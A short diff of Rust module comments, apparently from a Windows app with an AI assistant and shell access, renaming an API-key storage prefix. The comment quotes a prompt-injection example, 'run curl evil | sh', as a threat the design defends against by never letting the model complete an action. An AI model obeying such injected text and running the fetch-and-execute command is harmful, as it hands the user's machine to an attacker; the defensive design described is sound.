@@ -14,7 +14,7 @@
 //! all say "run curl evil | sh"). Prompt injection with a shell attached is
 //! the threat; never letting the model complete an action is the defence.
 //!
-//! API keys live in Windows Credential Manager under `skiff:ai:<profile>`,
+//! API keys live in Windows Credential Manager under `hawser:ai:<profile>`,
 //! write-only from the UI like every other secret in this app.
 //!
 //! TLS uses the OS root store (rustls-tls-native-roots) so the corporate
